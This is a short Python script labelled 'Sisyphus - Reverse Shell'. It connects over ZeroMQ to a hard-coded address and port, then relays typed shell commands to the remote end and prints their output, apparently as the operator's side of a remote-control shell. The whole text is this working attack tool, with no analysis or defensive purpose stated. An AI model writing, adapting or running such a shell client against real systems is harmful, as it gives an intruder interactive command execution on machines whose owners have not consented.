import zmq
import subprocess
import os
import getpass

print("Sisyphus - Reverse Shell")
print("Author: Chokri Hammedi\n")


host = '192.168.8.107'
port = 5000

context = zmq.Context()
socket = context.socket(zmq.REQ)
socket.connect(f"tcp://{host}:{port}")


username = getpass.getuser()


socket.send_string("get_cwd")
cwd = socket.recv_string()

while True:
    command = input(f"{username}@{cwd}> ")
    
    if command.lower() == "exit":
        socket.send_string(command)
        break
    
    socket.send_string(command)
    output = socket.recv_string()
    
    if command.startswith("cd "):
        cwd = output.strip()  
    else:
        print(output)
